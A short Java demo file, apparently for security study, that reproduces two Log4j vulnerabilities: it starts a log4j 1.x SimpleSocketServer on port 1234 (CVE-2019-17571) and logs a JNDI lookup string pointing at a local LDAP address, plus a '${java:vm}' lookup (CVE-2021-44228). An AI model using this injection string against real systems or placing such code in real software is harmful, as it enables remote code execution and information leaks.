package com.zhunongyun.toalibaba.securitystudy.controller;

import org.apache.log4j.net.SimpleSocketServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Log4j 安全漏洞
 *
 * @author oscar
 */
public class Log4jLeak {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        Log4jLeak log4jLeak = new Log4jLeak();
//        log4jLeak.CVE_2019_17571();

        log4jLeak.CVE_2021_44228();
    }

    /**
     * CVE-2019-17571 漏洞
     * log4j 1.x 版本存在的漏洞
     */
    private void CVE_2019_17571() {
        logger.info("Listening on port 1234");
        String[] arguments = {"1234", (new Log4jLeak()).getClass().getClassLoader().getResource("log4j.properties").getPath()};
        SimpleSocketServer.main(arguments);
        logger.info("Log4j output success");
    }

    /**
     * CVE_2021_44228 漏洞
     * log4j 2.x 版本存在的漏洞
     */
    private void CVE_2021_44228() {
        logger.info("hello {}", "${jndi:ldap://127.0.0.1:8090/api/bugApi}");
        logger.info("hello {}", "${java:vm}");
    }
}